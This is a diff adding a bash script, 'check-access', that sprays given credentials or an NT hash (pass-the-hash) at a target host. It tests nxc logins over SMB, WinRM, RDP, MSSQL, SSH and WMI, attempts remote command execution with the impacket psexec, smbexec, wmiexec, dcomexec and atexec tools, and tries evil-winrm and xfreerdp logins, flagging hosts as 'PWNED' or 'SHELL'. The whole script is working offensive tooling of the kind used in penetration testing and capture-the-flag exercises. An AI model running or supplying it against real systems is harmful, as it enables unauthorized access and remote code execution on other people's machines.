@@ -1,0 +1,180 @@
+#!/bin/bash
+
+# Check ALL remote execution/access methods for given credentials
+# Usage: check-access <IP> -u <user> -p <pass> [-d <domain>] [-H <hash>]
+
+BLUE='\033[0;34m'
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+YELLOW='\033[38;5;226m'
+GREY='\033[38;5;244m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${YELLOW}Usage: check-access <IP> -u <username> [-p <password>] [-H <nthash>] [-d <domain>]${NC}"
+    echo -e "  -p  password"
+    echo -e "  -H  NT hash (pass-the-hash)"
+    echo -e "  -d  domain"
+    echo -e "  Provide -p or -H (or both)"
+    exit 1
+}
+
+if [[ -z "$1" || "$1" == -* ]]; then usage; fi
+
+TARGET=$1; shift
+DOMAIN=""
+HASH=""
+PASS=""
+
+while [[ "$#" -gt 0 ]]; do
+    case $1 in
+        -u) USER=$2; shift 2 ;;
+        -p) PASS=$2; shift 2 ;;
+        -d) DOMAIN=$2; shift 2 ;;
+        -H) HASH=$2; shift 2 ;;
+        *) shift 1 ;;
+    esac
+done
+
+if [[ -z "$TARGET" || -z "$USER" ]]; then usage; fi
+if [[ -z "$PASS" && -z "$HASH" ]]; then usage; fi
+
+echo -e "${BLUE}[*] Checking all access methods for ${USER} @ ${TARGET}${NC}"
+echo -e "${BLUE}[*] Domain: ${DOMAIN:-N/A} | Pass: ${PASS:+set} | Hash: ${HASH:-N/A}${NC}\n"
+
+ok()   { echo -e "${GREEN}[+] $1${NC}"; }
+fail() { echo -e "${RED}[-] $1${NC}"; }
+skip() { echo -e "${GREY}[-] $1${NC}"; }
+warn() { echo -e "${YELLOW}[~] $1${NC}"; }
+
+port_open() { nc -z -w 1 "$TARGET" "$1" 2>/dev/null; }
+
+# ── Build credential args ────────────────────────────────
+
+nxc_auth() {
+    if [[ -n "$HASH" ]]; then
+        echo "-u $USER -H $HASH"
+    else
+        echo "-u $USER -p $PASS"
+    fi
+}
+
+nxc_domain() {
+    [[ -n "$DOMAIN" ]] && echo "-d $DOMAIN"
+}
+
+imp_cred() {
+    local PREFIX="${DOMAIN:+${DOMAIN}/}"
+    if [[ -n "$HASH" ]]; then
+        echo "${PREFIX}${USER}@${TARGET} -hashes :${HASH}"
+    else
+        echo "${PREFIX}${USER}:${PASS}@${TARGET}"
+    fi
+}
+
+# ── nxc checks ────────────────────────────────────────────
+
+echo -e "${BLUE}── nxc protocols ──${NC}"
+
+nxc_check() {
+    local PORT=$1 PROTO=$2 LABEL=$3; shift 3
+    if ! port_open "$PORT"; then skip "$LABEL: port $PORT closed"; return; fi
+    local OUT
+    if [[ -n "$HASH" ]]; then
+        OUT=$(timeout 15 nxc "$PROTO" "$TARGET" -u "$USER" -H "$HASH" ${DOMAIN:+-d "$DOMAIN"} "$@" 2>&1)
+    else
+        OUT=$(timeout 15 nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" ${DOMAIN:+-d "$DOMAIN"} "$@" 2>&1)
+    fi
+    if echo "$OUT" | grep -qi "Pwn3d\|pwned"; then
+        ok "$LABEL: PWNED (admin)"
+    elif echo "$OUT" | grep -q "\[+\]"; then
+        warn "$LABEL: auth ok (no admin)"
+    elif echo "$OUT" | grep -qi "LOGON_FAILURE\|FAILURE\|Failed\|Authentication failed"; then
+        fail "$LABEL: auth failed"
+    else
+        fail "$LABEL: error/timeout"
+    fi
+}
+
+nxc_check 445 smb "SMB"
+nxc_check 5985 winrm "WinRM"
+nxc_check 3389 rdp "RDP"
+nxc_check 1433 mssql "MSSQL"
+nxc_check 22 ssh "SSH"
+nxc_check 135 wmi "WMI"
+
+# ── impacket exec methods ─────────────────────────────────
+
+echo -e "\n${BLUE}── impacket exec methods ──${NC}"
+
+imp_check() {
+    local TOOL=$1 LABEL=$2; shift 2
+    if ! command -v "$TOOL" &>/dev/null; then skip "$LABEL: $TOOL not found"; return; fi
+    local OUT
+    if [[ -n "$HASH" ]]; then
+        OUT=$(timeout 15 "$TOOL" "${DOMAIN:+${DOMAIN}/}${USER}@${TARGET}" -hashes ":${HASH}" "$@" 'whoami' 2>&1)
+    else
+        OUT=$(timeout 15 "$TOOL" "${DOMAIN:+${DOMAIN}/}${USER}:${PASS}@${TARGET}" "$@" 'whoami' 2>&1)
+    fi
+    if echo "$OUT" | grep -qi "nt authority\|${USER}\|admin"; then
+        ok "$LABEL: SHELL"
+    elif echo "$OUT" | grep -qi "LOGON_FAILURE\|ACCESS_DENIED\|STATUS_"; then
+        fail "$LABEL: denied"
+    else
+        fail "$LABEL: failed"
+    fi
+}
+
+imp_check impacket-psexec    "PSExec"
+imp_check impacket-smbexec   "SMBExec"
+imp_check impacket-wmiexec   "WMIExec"
+imp_check impacket-dcomexec  "DCOMExec"
+imp_check impacket-atexec    "AtExec"
+
+# ── evil-winrm ────────────────────────────────────────────
+
+echo -e "\n${BLUE}── evil-winrm ──${NC}"
+
+if ! port_open 5985; then
+    skip "Evil-WinRM: port 5985 closed"
+elif ! command -v evil-winrm &>/dev/null; then
+    skip "Evil-WinRM: not installed"
+else
+    if [[ -n "$HASH" ]]; then
+        WINRM_OUT=$(timeout 15 evil-winrm -i "$TARGET" -u "$USER" -H "$HASH" 2>&1 </dev/null)
+    else
+        WINRM_OUT=$(timeout 15 evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" 2>&1 </dev/null)
+    fi
+    if echo "$WINRM_OUT" | grep -qi "WinRMAuthorizationError\|Authorization\|Access is denied"; then
+        fail "Evil-WinRM: access denied"
+    elif echo "$WINRM_OUT" | grep -qi "Evil-WinRM shell\|PS "; then
+        ok "Evil-WinRM: SHELL"
+    else
+        fail "Evil-WinRM: failed"
+    fi
+fi
+
+# ── RDP (xfreerdp auth-only) ─────────────────────────────
+
+echo -e "\n${BLUE}── RDP login test ──${NC}"
+
+if ! port_open 3389; then
+    skip "RDP: port 3389 closed"
+elif ! command -v xfreerdp &>/dev/null; then
+    skip "RDP: xfreerdp not installed"
+else
+    if [[ -n "$HASH" ]]; then
+        RDP_OUT=$(timeout 10 xfreerdp /v:"$TARGET" /u:"$USER" /pth:"$HASH" ${DOMAIN:+/d:"$DOMAIN"} /cert:ignore /sec:tls +auth-only 2>&1)
+    else
+        RDP_OUT=$(timeout 10 xfreerdp /v:"$TARGET" /u:"$USER" /p:"$PASS" ${DOMAIN:+/d:"$DOMAIN"} /cert:ignore /sec:tls +auth-only 2>&1)
+    fi
+    if echo "$RDP_OUT" | grep -qi "Authentication only.*success\|LOGON_USER\|negotiation\|connected"; then
+        ok "RDP: LOGIN OK"
+    elif echo "$RDP_OUT" | grep -qi "LOGON_FAILURE\|WRONG_PASSWORD\|ACCOUNT_LOCKED\|ERR_CONNECT"; then
+        fail "RDP: auth failed"
+    else
+        warn "RDP: unclear (check manually)"
+    fi
+fi
+
+echo -e "\n${BLUE}[*] Done.${NC}"
